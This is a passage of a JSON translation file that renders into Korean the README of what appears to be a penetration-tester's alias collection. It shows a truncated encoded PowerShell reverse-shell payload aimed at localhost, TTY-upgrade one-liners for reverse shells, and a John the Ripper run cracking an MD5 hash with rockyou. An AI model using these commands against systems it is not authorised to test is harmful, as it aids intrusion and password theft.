+        "translatedContent": "┌──(jazz㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "wMwu60pkeM576zsQm4LpTx0tSHOSLKFbkvyUZDnLlzE=",
+        "originContent": "└─$ gen_ps_rev 127.0.0.1 1337",
+        "translatedContent": "└─$ gen_ps_rev 127.0.0.1 1337"
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 15,
+    "Content": "Clipboard contents after:",
+    "ContentSha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "클립보드 내용 이후:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+        "originContent": "Clipboard contents after:",
+        "translatedContent": "클립보드 내용 이후:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 16,
+    "Content": "```\npowershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...\n```",
+    "ContentSha": "AlADA21VD2m/A6641MOh++kiV8DJWIFJY5Alu8/5FUQ=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\npowershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "mk/J8gaI0SWJYHdFnjg+P9ghbOxT78/1Z7ZNaGELp80=",
+        "originContent": "powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...",
+        "translatedContent": "powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A..."
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 17,
+    "Content": "\n## TTY upgrades\n### > uptty\nCopies the python(2) and python3 tty upgrade command to the clipboard. \nExample: ",
+    "ContentSha": "8EaWJUDHtzUeTBEksaZaf3OUym5uGxPD6PeuSI5QKwA=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n## TTY 업그레이드\n### > uptty\npython(2) 및 python3 tty 업그레이드 명령어를 클립보드에 복사합니다.\n예시: ",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "IzNKjgdoP0EoE89ltdFhJ+kdk6VOtab9yGYeybWnl0c=",
+        "originContent": "## TTY upgrades",
+        "translatedContent": "## TTY 업그레이드"
+      },
+      {
+        "row": 3,
+        "rowsha": "ht4fyYc7YUwJ5HV/slXGcHlEwSptZBC+Ye9ZZ7+wxDk=",
+        "originContent": "### > uptty",
+        "translatedContent": "### > uptty"
+      },
+      {
+        "row": 4,
+        "rowsha": "9d0Eld+b/5XJhzMzZRwouJgABOG31YFYO/9UYvQtQHI=",
+        "originContent": "Copies the python(2) and python3 tty upgrade command to the clipboard. ",
+        "translatedContent": "python(2) 및 python3 tty 업그레이드 명령어를 클립보드에 복사합니다."
+      },
+      {
+        "row": 5,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시: "
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 18,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ uptty\n```",
+    "ContentSha": "gCcf03NeJMagJ5NITXk58365K0omCHzGxM4aMLMgtF4=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ uptty\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "1TFP0B23DPhJ85Uq8KXQrfl1o5HTrINJdexKjjoKjCY=",
+        "originContent": "└─$ uptty",
+        "translatedContent": "└─$ uptty"
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 19,
+    "Content": "Clipboard contents after:",
+    "ContentSha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "클립보드 내용 이후:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+        "originContent": "Clipboard contents after:",
+        "translatedContent": "클립보드 내용 이후:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 20,
+    "Content": "```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'\n```",
+    "ContentSha": "TQlacYVBrNg3K8SpDI1fceHOcsuFkzqlvZQliX8P754=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "0lrDxl1jinzh1w1T2eTUm5FI5vw1Tf6Z9q64Y5yA9CY=",
+        "originContent": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+        "translatedContent": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 21,
+    "Content": "> #### Notes\n> - Requires `xclip` to be installed\n> - `py_tty_upgrade` and `py3_tty_upgrade` are still included for now but will call this alias instead\n\n### > script_tty_upgrade\nWhen Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. \nExample: ",
+    "ContentSha": "G3GGbzYyBmeyTRQUJy/OcO3UWXx95rq6H94x1GpLSEI=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 참고사항\n> - `xclip` 설치가 필요합니다\n> - `py_tty_upgrade`와 `py3_tty_upgrade`는 현재까지 포함되어 있으나 대신 이 별칭을 호출합니다\n\n### > script_tty_upgrade\n원격 머신에 Python이 설치되어 있지 않은 경우 이 명령어를 사용하여 tty 셸로 업그레이드하는 `script` 방법을 클립보드에 복사할 수 있습니다. \n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 참고사항"
+      },
+      {
+        "row": 2,
+        "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+        "originContent": "> - Requires `xclip` to be installed",
+        "translatedContent": "> - `xclip` 설치가 필요합니다"
+      },
+      {
+        "row": 3,
+        "rowsha": "AqjAEuFg77Q2KUgT4unUVmTvI8Ef7yxUbyx9MHVhzNs=",
+        "originContent": "> - `py_tty_upgrade` and `py3_tty_upgrade` are still included for now but will call this alias instead",
+        "translatedContent": "> - `py_tty_upgrade`와 `py3_tty_upgrade`는 현재까지 포함되어 있으나 대신 이 별칭을 호출합니다"
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 5,
+        "rowsha": "eUxABB0l7Fq3v9YTtUq22Lxd2HWpA7o5CqnaUNOLBeo=",
+        "originContent": "### > script_tty_upgrade",
+        "translatedContent": "### > script_tty_upgrade"
+      },
+      {
+        "row": 6,
+        "rowsha": "AsHzs+Cmr7eYMnpSwXFa5J0CEd+jZLGbqJ2sekannMA=",
+        "originContent": "When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. ",
+        "translatedContent": "원격 머신에 Python이 설치되어 있지 않은 경우 이 명령어를 사용하여 tty 셸로 업그레이드하는 `script` 방법을 클립보드에 복사할 수 있습니다. "
+      },
+      {
+        "row": 7,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 22,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ script_tty_upgrade\n```",
+    "ContentSha": "HJ3iBJADOa179aXSrS+rSC16wxN87lEhgToW9Fx2S+8=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ script_tty_upgrade\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "+20e6VOmG1efTHQ6pOBUqgohdj80gYLkFWBAj3qplRk=",
+        "originContent": "└─$ script_tty_upgrade",
+        "translatedContent": "└─$ script_tty_upgrade"
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 23,
+    "Content": "Clipboard contents after:",
+    "ContentSha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "클립보드 내용 이후:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+        "originContent": "Clipboard contents after:",
+        "translatedContent": "클립보드 내용 이후:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 24,
+    "Content": "```\n/usr/bin/script -qc /bin/bash /dev/null\n```",
+    "ContentSha": "9Y6xhgJs+/65bofcjQR7ekJ4fITVNhYFpb96ayMe6K0=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n/usr/bin/script -qc /bin/bash /dev/null\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "GHOvmGHK6qYD/iH1zKGsSGueVW+edx/E/fiWl8Am+lg=",
+        "originContent": "/usr/bin/script -qc /bin/bash /dev/null",
+        "translatedContent": "/usr/bin/script -qc /bin/bash /dev/null"
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 25,
+    "Content": "> #### Notes\n> - Requires `xclip` to be installed\n\n### > tty_fix\nRuns `stty raw -echo; fg; reset` should be used after using one of the above tty upgrades.\n\n### > tty_conf\nGrabs the current tty settings (number of rows and columns) and copies a oneliner to the clipboard that can be pasted straight into your reverse shell window to get those settings to match up. This fixes the issue of line wrapping occuring halfway in your terminal. \nExample: ",
+    "ContentSha": "VHoCsJUeVDZreS5slLQCA2V6ojOK47nJUaXdpsDE8Nc=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - `xclip` 설치가 필요합니다\n\n### > tty_fix\n`stty raw -echo; fg; reset` 명령어를 실행하며, 위의 tty 업그레이드를 사용한 후에 사용해야 합니다.\n\n### > tty_conf\n현재 tty 설정(행과 열 수)을 가져와서 클립보드에 복사하는 원라이너를 제공합니다. 이를 리버스 셸 창에 바로 붙여넣으면 해당 설정과 일치시킬 수 있습니다. 이 방법은 터미널에서 줄 바꿈이 중간에 발생하는 문제를 해결합니다.  \n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+        "originContent": "> - Requires `xclip` to be installed",
+        "translatedContent": "> - `xclip` 설치가 필요합니다"
+      },
+      {
+        "row": 3,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "AMlhJCjqNEc9CsxqdIdCNIVUrFMdolNQFYLP/YzQv+Q=",
+        "originContent": "### > tty_fix",
+        "translatedContent": "### > tty_fix"
+      },
+      {
+        "row": 5,
+        "rowsha": "P6718zD6CFHeIvl8g/oWvwvuqG0UWLevFBOh1aDlCw0=",
+        "originContent": "Runs `stty raw -echo; fg; reset` should be used after using one of the above tty upgrades.",
+        "translatedContent": "`stty raw -echo; fg; reset` 명령어를 실행하며, 위의 tty 업그레이드를 사용한 후에 사용해야 합니다."
+      },
+      {
+        "row": 6,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 7,
+        "rowsha": "Dochc4YNZ0/YlpcaNrHuXSg1uvzu0iRVoqYMgSL+3rM=",
+        "originContent": "### > tty_conf",
+        "translatedContent": "### > tty_conf"
+      },
+      {
+        "row": 8,
+        "rowsha": "yky50z9BPQoIgCZ9Y3GyOj+8haHCZbmdpP0AmoCPhkE=",
+        "originContent": "Grabs the current tty settings (number of rows and columns) and copies a oneliner to the clipboard that can be pasted straight into your reverse shell window to get those settings to match up. This fixes the issue of line wrapping occuring halfway in your terminal. ",
+        "translatedContent": "현재 tty 설정(행과 열 수)을 가져와서 클립보드에 복사하는 원라이너를 제공합니다. 이를 리버스 셸 창에 바로 붙여넣으면 해당 설정과 일치시킬 수 있습니다. 이 방법은 터미널에서 줄 바꿈이 중간에 발생하는 문제를 해결합니다.  "
+      },
+      {
+        "row": 9,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 26,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ tty_conf               \n```",
+    "ContentSha": "dn3LyQKZ2xITDlsLlIuB8RxluHrTdv4wkD9iRqI9gtk=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ tty_conf               \n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "Dss3DMlb7Jini+xbu3unCCD3iSoEH1va2p52pgX6hbE=",
+        "originContent": "└─$ tty_conf               ",
+        "translatedContent": "└─$ tty_conf               "
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 27,
+    "Content": "Clipboard contents after:",
+    "ContentSha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "클립보드 내용 이후:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+        "originContent": "Clipboard contents after:",
+        "translatedContent": "클립보드 내용 이후:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 28,
+    "Content": "```\nstty rows 30 columns 116\n```",
+    "ContentSha": "aVh/GY4vPbGD0LDq+/DD1OgDrGudc/o4ygmrgsUxbbE=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\nstty rows 30 columns 116\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "bKNzWJQrv8+ejmz89Bqo3r/UKyvhW6mGnWv6Qn43LiQ=",
+        "originContent": "stty rows 30 columns 116",
+        "translatedContent": "stty rows 30 columns 116"
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 29,
+    "Content": "> #### Notes\n> - Requires `xclip` to be installed\n\n## Hashcracking\n### > rock_john $hash_file (extra arguments)\nInstead of manually supplying rockyou as an argument with `--wordlist=/usr/share/wordlists/rockyou.txt` (without auto completion :/) this alias injects that argument and thus can be used to try and crack a hash using JohnTheRipper and the rockyou wordlist more easily. \nExample: ",
+    "ContentSha": "oGLSgmkuSsRcFubcYrt9cTo1RdTy9aeJiIcjKICrb00=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - `xclip` 설치 필요\n\n## 해시 크래킹\n### > rock_john $hash_file (추가 인자)\n수동으로 `--wordlist=/usr/share/wordlists/rockyou.txt` (자동 완성 불가 :/)를 인자로 제공하는 대신, 이 별칭은 해당 인자를 주입하여 JohnTheRipper와 rockyou 단어 목록을 사용해 해시를 더 쉽게 크래킹하는 데 사용할 수 있습니다.\n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+        "originContent": "> - Requires `xclip` to be installed",
+        "translatedContent": "> - `xclip` 설치 필요"
+      },
+      {
+        "row": 3,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "qBCPcP3JBJVZqMOzk/JBXUAKf/TWsE3ClyBCDmmyqMc=",
+        "originContent": "## Hashcracking",
+        "translatedContent": "## 해시 크래킹"
+      },
+      {
+        "row": 5,
+        "rowsha": "lBUwiqmPd74IdoRaajL5gDkwKyRdpkvAjdTxIYSrmls=",
+        "originContent": "### > rock_john $hash_file (extra arguments)",
+        "translatedContent": "### > rock_john $hash_file (추가 인자)"
+      },
+      {
+        "row": 6,
+        "rowsha": "cWaaar/NGhrRPRoFpZvSrtf3Saa2AS8FpEEtlhoNVgc=",
+        "originContent": "Instead of manually supplying rockyou as an argument with `--wordlist=/usr/share/wordlists/rockyou.txt` (without auto completion :/) this alias injects that argument and thus can be used to try and crack a hash using JohnTheRipper and the rockyou wordlist more easily. ",
+        "translatedContent": "수동으로 `--wordlist=/usr/share/wordlists/rockyou.txt` (자동 완성 불가 :/)를 인자로 제공하는 대신, 이 별칭은 해당 인자를 주입하여 JohnTheRipper와 rockyou 단어 목록을 사용해 해시를 더 쉽게 크래킹하는 데 사용할 수 있습니다."
+      },
+      {
+        "row": 7,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 30,
+    "Content": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ rock_john hash.txt --format=Raw-MD5\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\njazz             (?)     \n1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```",
+    "ContentSha": "7HjYzv0ydH+d28BNHJVoZWMsTImhbjacwrrJRUfFMqQ=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~/jazz]\n└─$ rock_john hash.txt --format=Raw-MD5\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\njazz             (?)     \n1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+        "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "5LF4Ovl4mYr7bgCLh0pr4CKs10yiyNW1eAIi+Y29j14=",
+        "originContent": "└─$ rock_john hash.txt --format=Raw-MD5",
+        "translatedContent": "└─$ rock_john hash.txt --format=Raw-MD5"
+      },
+      {
+        "row": 4,
+        "rowsha": "6w5pfZtjwi8wNNDOLnX8G5ExjDJqZvMMmlUn28ejZeo=",
+        "originContent": "Using default input encoding: UTF-8",
+        "translatedContent": "Using default input encoding: UTF-8"
+      },
+      {
+        "row": 5,
+        "rowsha": "bpocKFnlep0C4xvnwpEK5PxyRHgVI8LQyr1GyBfDVdw=",
+        "originContent": "Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])",
+        "translatedContent": "Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])"
+      },
+      {
+        "row": 6,
+        "rowsha": "BTtXkdFB0EUqEBU0GHTCE7ErPS/U3x0cvDraLRuObSI=",
+        "originContent": "Warning: no OpenMP support for this hash type, consider --fork=8",
+        "translatedContent": "Warning: no OpenMP support for this hash type, consider --fork=8"
+      },
+      {
+        "row": 7,
+        "rowsha": "OYi9tR55NHjHem5vd02zYBsYTjO+pmvuYgZFsdQUxsY=",
+        "originContent": "Press 'q' or Ctrl-C to abort, almost any other key for status",
+        "translatedContent": "Press 'q' or Ctrl-C to abort, almost any other key for status"
+      },
+      {
+        "row": 8,
+        "rowsha": "UZIRgglsMYbL7q180pfFctl10XHZhF/x6z1N3KP2Tpk=",
+        "originContent": "jazz             (?)     ",
+        "translatedContent": "jazz             (?)     "
+      },
+      {
+        "row": 9,
+        "rowsha": "awYQEC5m6I8TbKJfG40SCBpB+lwYlmZ5F3rTo1ZmNEk=",
+        "originContent": "1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke",
+        "translatedContent": "1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke"
+      },
+      {
+        "row": 10,
+        "rowsha": "SI9JPnXYv+eYy1cvq1NB6z2pBaH2OSMRSq+R8Qwx2Gg=",
+        "originContent": "Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably",
+        "translatedContent": "Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably"
+      },
+      {
+        "row": 11,
+        "rowsha": "Tb4hpjEH/THx5vpqBmNkTZHHbZnu3ll+yOz32kOui1Q=",
+        "originContent": "Session completed.",
+        "translatedContent": "Session completed."
+      },
+      {
+        "row": 12,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 31,
+    "Content": "> #### Notes\n> - Kali seems to have fixed auto completion for John in 2022.2! This alias still saves you some effort though ;)\n## Portscanning\n### > nmap_tcp $ip (extra arguments)\nStarts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. \nExample: ",
+    "ContentSha": "UXhgQzHaYGPUxx77JMVokEK2VuafHQ2s0zP9QQ6YAlM=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - Kali는 2022.2 버전에서 John의 자동 완성을 수정한 것 같습니다! 이 별칭은 여전히 약간의 수고를 덜어줍니다 ;)\n## 포트스캐닝\n### > nmap_tcp $ip (추가 인자)\n기본 설정으로 TCP nmap 스캔을 시작하고 스캔 결과를 nmap 디렉터리에 출력합니다. 디렉터리가 없으면 자동으로 생성됩니다.\n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "yChShpfFzeALQZXQmXzQSEGx885U02uZH+B2HC0yN+s=",
+        "originContent": "> - Kali seems to have fixed auto completion for John in 2022.2! This alias still saves you some effort though ;)",
+        "translatedContent": "> - Kali는 2022.2 버전에서 John의 자동 완성을 수정한 것 같습니다! 이 별칭은 여전히 약간의 수고를 덜어줍니다 ;)"
+      },
+      {
+        "row": 3,
+        "rowsha": "ESAJKzbKsqeiP1IyhCsncILfnMhA0MQLcEG2HtpnH2I=",
+        "originContent": "## Portscanning",
+        "translatedContent": "## 포트스캐닝"
+      },
+      {
+        "row": 4,
+        "rowsha": "M3lq6d+quwAJU23x8M0kJYFAs+akQet3QACMV5QRa/E=",
+        "originContent": "### > nmap_tcp $ip (extra arguments)",
+        "translatedContent": "### > nmap_tcp $ip (추가 인자)"
+      },
+      {
+        "row": 5,
+        "rowsha": "1EotmAMkn5JQ+H0P9slkuMbQ9fThrn2Ihk331SKjvvs=",
+        "originContent": "Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. ",
+        "translatedContent": "기본 설정으로 TCP nmap 스캔을 시작하고 스캔 결과를 nmap 디렉터리에 출력합니다. 디렉터리가 없으면 자동으로 생성됩니다."
+      },
+      {
+        "row": 6,
